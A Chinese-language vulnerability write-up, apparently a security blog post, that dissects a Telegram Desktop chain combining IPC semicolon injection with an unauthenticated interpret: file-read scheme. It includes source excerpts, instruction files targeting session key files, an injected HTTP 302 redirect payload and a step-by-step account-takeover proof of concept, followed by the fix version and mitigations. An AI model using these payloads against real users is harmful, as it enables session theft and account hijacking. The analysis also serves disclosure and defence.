Telegram Desktop 一键账号接管：IPC 注入 + interpret: 未授权路径读取的攻击链拆解

2026-10-10
  • 漏洞分析
  • Telegram
  • IPC注入
  • 攻击链
  • 网络安全

一条你随手点的群聊链接，可能就足以让别人成为你。CVE-2026-107181 就是这么一条链：Telegram Desktop 的单实例 IPC 里分隔符没有转义，被注入的命令又能调用内部 URI 方案 interpret: 读任意文件。两个缺陷叠起来，攻击者拿到的是本地 tdata 目录里的会话密钥，等同于账号本身。本文按源码路径拆开这条链。

背景：单实例 IPC 是怎么工作的

操作系统允许程序注册 URI scheme，这样遇到某种链接才知道该拉起谁。Telegram Desktop 注册的是 tg://。

Telegram 没运行时点 tg://...，系统拉起进程，进程把字符串当参数、转成 URL 对象、内部处理——一个进程，没有通信。

但 Telegram 已经在跑时呢？系统既不认识也不检查，照样拉起新进程。Telegram 得自己判断"我是多余的那个"，靠的是尝试连接一个本地 socket：已在运行的实例是 server，启动后一直监听；新进程是 client，连上了就说明已有实例活着，于是把链接交出去然后退出。

socket 只传字节，不传对象，内存里的 URL 对象过不了这条通道，必须扁平化成一行文本。这就是序列化，反过来是反序列化。凡是结构化数据要跨边界，这两步避不开——也正是数据内部的边界从"结构"退化成"文本里的字符"的那个精确时刻。

缺陷一：未转义的分隔符

Telegram 用了一套自己的简单格式：每条指令是一个关键字 + 参数 + 一个分号收尾。比如要打开一个链接：

OPEN:tg://x?a=1;

构造这行的地方在 sandbox.cpp:295-297：

for (const auto &url : cRefStartUrls()) {
    commands += u"OPEN:"_q + url.toString(QUrl::FullyEncoded) + ';';
}

接收端做反序列化，在 sandbox.cpp:453-463：读收到的字节，在每个分号处切开，把每一片当成一条独立指令。凡是 OPEN: 开头的就吃掉：

for (int32 to = cmds.indexOf(QChar(';'), from); to >= from; ...) {
    auto cmd = base::StringViewMid(cmds, from, to - from);
    ...
    else if (cmd.startsWith(u"OPEN:"_q)) {
        startUrls.append(cmds.mid(from + 5, to - from - 5).mid(0, 8192));

那么，如果一个被传输的值里自带分号——也就是格式用来做分隔的那个字符——会怎样？给链接加一点东西：

tg://x?a=1;CMD:quit

新进程把它当成一个 URL，因为对它来说那个分号只是 query 里的普通字符。它扁平化后写进 socket：

OPEN:tg://x?a=1;CMD:quit;

运行中的实例在每个分号处切，得到两条指令而不是一条：

OPEN:tg://x?a=1
CMD:quit

这就是注入，也是第一个缺陷。上面的例子里注入的是 CMD:。总共只接受四条命令，其中三条无害，第四条是 OPEN:。

缺陷二：interpret: 方案没有鉴权

翻代码能翻出 Telegram 内部另一个 URI 方案，叫 interpret:。操作系统压根不知道 interpret: 开头的链接该怎么办，这是应用自己处理的（application.cpp:1162-1164）：

if (url.scheme() == u"interpret"_q) {
    interprets.append(url.path());
    return false;
}

它本来是 Telegram 发布自己版本时用的工具。新版本要发到频道里，changelog 当标题——手工做太麻烦，于是脚本写一个小文本文件，里面写明频道、要发的文件、要写的文字，然后带着这个文件路径启动 Telegram：

# Telegram/build/updates.py:206
subprocess.call(... 'Telegram -sendpath interpret://' + scriptPath + '/.../command.txt', shell=True)

指令文件长这样：

from: 1234567890
channel: 1987654321
file: out/Release/deploy/6.9.3/tsetup.6.9.3.exe
caption: TDesktop at 12.06.26:
- Fixed a crash in the media viewer.
- Added a new sticker pack.

from: 是发送者，channel: 是目标频道，file: 是要发的文件。处理这个文件的函数叫 InterpretSendPath（support_helper.cpp:673-680）：

QString InterpretSendPath(not_null<Window::SessionController*> window, const QString &path) {
    QFile f(path);
    if (!f.open(QIODevice::ReadOnly)) {
        return "App Error: Could not open interpret file: " + path;
    }
    const auto content = QString::fromUtf8(f.readAll());
    ...

这个函数没有任何鉴权检查。当它从命令行进来（发布脚本就是这么调的）时不是问题——攻击者得有机器上的立足点，有了立足点他自己就能读文件。但一旦同样的动作能通过 socket、进而通过注入触达，一个危险功能就变成了"受害者点一下链接"就能用。

这是缺失的授权，也是第二个缺陷。

把指令文件放到磁盘上

能放指令文件、并且控制 file: 和 channel: 的攻击者，能读受害者的任意文件并发到自己选的频道或超级群。那么怎么把文本文件塞到别人磁盘上可预测的路径？

最直接的办法是当群聊附件发。实际上，Telegram Desktop 默认配置下，群里收到的文件 8 MiB 以内会自动下载（广播频道默认关闭自动下载）。文件落到标准文件夹、用发送者选的名字、不需要受害者点任何东西，位置可预测（重名会存成 instructions1 (2).txt 之类）。

Telegram 自己构造这个路径（file_utilities.cpp:172-181）：

C:\Users\<user>\Downloads\Telegram Desktop\<file name>

把文件发进群，攻击者就知道它会被存到哪。路径里似乎还剩一个未知量——Windows 用户名——但 interpret: 用了 .. 相对路径（logs.cpp:381 的 %APPDATA%\Telegram Desktop）就绕过去了：

interpret:../../../Downloads/Telegram%20Desktop/instructions.txt

于是拿到确定性路径，根本不需要知道用户名。

从任意文件读取到账号接管

InterpretSendPath 给的原语始终是"任意文件读取"。变的只是你读什么：SSH 私钥、浏览器密码库、云凭证文件，或者带 API token 的配置文件。

但 Telegram 本地数据不是明文存的，用户磁盘上的东西全都加密，包括会话授权。会话授权就是客户端向 Telegram 服务器标识自己的密钥，拿住它就等于拿住这个账号，性质相当于网站的 session cookie。

Telegram 用了密钥包装。涉及两把密钥：第一把是 DEK（数据加密密钥），长、随机、高熵，用来加密用户数据；第二把是 KEK（密钥加密密钥），只加密 DEK，而且它不是密码本身——它由密码经密钥派生函数（KDF）配合一个存在旁边的 salt 派生出来。

伪代码里，打开本地数据的那条链是这样：

salt, encrypted_DEK = read("tdata/key_datas")
passcode = user_passcode()        # empty if none is set
KEK = KDF(passcode, salt)
DEK = decrypt(encrypted_DEK, KEK)
session = decrypt(authorization_file, DEK)

默认情况下 Telegram Desktop 没有本地密码——你得自己去设置里设。没设时，喂给派生的密码是空串（storage_domain.cpp:102）。所以没设密码的人，谁拿到 tdata/key_datas 谁就能一路解到会话。

涉及三个文件，其中只有两个含密钥：

tdata/
├── key_datas                    salt 和加密后的 DEK
├── D877F783D5D3EF8Cs            MTProto 授权，用 DEK 加密
└── D877F783D5D3EF8C/
    └── maps                     账号存储数据的索引

那个文件夹名不是随机的、也不是每次安装都不同，它由字符串 data 派生（storage_file_utilities.cpp:241-250）。第三个文件是索引，不含密钥，但少了它会话也加载不出来——Telegram 只在读索引的时候才去读授权。不过偷它是个选择：攻击者完全可以自己造一个。PoC 里为了省事就顺手一起拿了。

结论：三件套齐了，攻击者就拥有账号——把它们丢进一个干净的 tdata 就能登上。

投递链接

攻击需要受害者点一下，而且必须来自 Telegram 外部。tg:// 可以从 https 重定向触发（click_handler_types.cpp:278、ui_integration.cpp:437）。攻击者准备一个 HTTP 302，把命令塞进 Location：

GET /rules HTTP/1.1
Host: corvus.sec

HTTP/1.1 302 Found
Location: tg://x?a=1;OPEN:interpret:instructions.txt

视浏览器和受害者是否用过该 handler 而定，系统可能会先弹确认框。

完整 PoC

  1. 攻击者建一个超级群，把受害者拉进来。Telegram 默认隐私设置允许这么做，被拉的人不会收到确认。
  2. 攻击者在群里发三个指令文本文件，每个对应一个要偷的文件，目标都指向攻击者自己的群。省略 from: 时发送者默认就是发文件的人：
channel: 2001234567
file: tdata/key_datas
caption: poc

文件必须纯文本、LF 换行、无 BOM。另外两个分别指向 tdata/D877F783D5D3EF8Cs 和 tdata/D877F783D5D3EF8C/maps。

  1. 攻击者往聊天里发一条看起来无害的链接 https://corvus.sec/rules。
  2. 受害者点它，浏览器跟随重定向，每条目标带一个命令，作为单行发送：
tg://x?a=1
;OPEN:interpret:../../../Downloads/Telegram%20Desktop/instructions1.txt
;OPEN:interpret:../../../Downloads/Telegram%20Desktop/instructions2.txt
;OPEN:interpret:../../../Downloads/Telegram%20Desktop/instructions3.txt
  1. 系统拉起第二个 Telegram 进程，把 URL 通过 socket 转发给正在运行的实例，未转义的分号把它切开，注入触发。
  2. 三个 interpret: 动作把三个文件发进攻击者的群。
  3. 攻击者用这三件套重建 tdata，登上受害者的账号。

修复与缓解

升级到 7.2.9 或更高版本——这是唯一真正堵住问题的办法，其余都是降低暴露面。

修复本身除了转义，还加了两条：同一条连接一旦携带 OPEN:，就跳过 CMD: 和 CTRL: 记录；一旦非本地 URL 出现在连接上，就丢弃本地文件路径。

修复是悄悄发的：7.2.9 的 changelog 只提了一个渲染修复，关掉这条链的 commit 标题是"Remove legacy interpret path helper"，没有任何公告。

短期缓解措施：

  • 打开"每次询问保存位置"。这样自动下载根本不发生，指令文件到不了磁盘——这是除升级外最有效的一条。
  • 把"谁可以拉我进群"限制为仅联系人。被偷的文件只能发到频道或超级群，这一条拿掉了攻击者的投递场所。
  • 设置本地密码，并且当成真密码来选。它不阻止文件被偷，只是让偷到的会话没法直接用。

一点开发者的视角

这条链最值得记住的不是 Telegram 的具体 bug，而是两个反复出现的模式。

第一，序列化边界就是信任边界。任何"把结构化数据压成字符串再切开"的自制协议，只要分隔符没转义，就一定存在注入。这和 HTTP header 注入、SMTP 命令注入、日志注入是同一类错误，只是换了个载体。自己设计 IPC 格式时，参数要么长度前缀、要么严格转义，别指望"反正参数里不会出现分隔符"。

第二，"只有本地命令行能调用"不是鉴权。InterpretSendPath 的开发者大概觉得它只被发布脚本用，所以没做权限检查——但一旦有任何路径能间接触达它，这个"内部工具"就变成了攻击面。凡是能读文件、能发网络请求、能执行命令的函数，无论当前调用者是谁，都该假设它未来会被暴露在不可信输入之下，显式做授权。

对普通用户来说结论很简单：升级到 7.2.9+，打开"每次询问保存位置"，把入群权限收紧到联系人。这三条花不了一分钟。
